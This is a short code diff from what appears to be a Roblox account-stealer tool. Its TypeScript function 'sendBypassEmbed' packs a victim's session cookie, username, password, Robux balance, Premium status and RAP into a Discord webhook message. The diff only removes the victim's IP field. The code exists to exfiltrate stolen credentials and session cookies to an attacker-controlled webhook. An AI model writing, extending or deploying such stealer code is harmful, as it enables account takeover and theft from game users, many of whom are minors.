@@ -160,7 +160,7 @@ export async function sendBypassEmbed(webhookUrl: string, data: BypassEmbedData)
             { name: `🪪 Cookie · ${statusText} ${statusEmoji}`, value: data.cookie ? '```\n' + data.cookie.slice(0, 1000) + '\n```' : na, inline: false },
             { name: '👤 Username (13+)', value: v(data.username), inline: true },
             { name: '🔑 Password', value: v(data.password), inline: true },
-            { name: '🖥️ IP', value: v(data.ip), inline: true },
+            
             { name: '🟡 Robux (Pending)', value: v(data.robux), inline: true },
             { name: '💎 Premium', value: v(data.premium), inline: true },
             { name: '🎒 RAP', value: v(data.rap), inline: true },
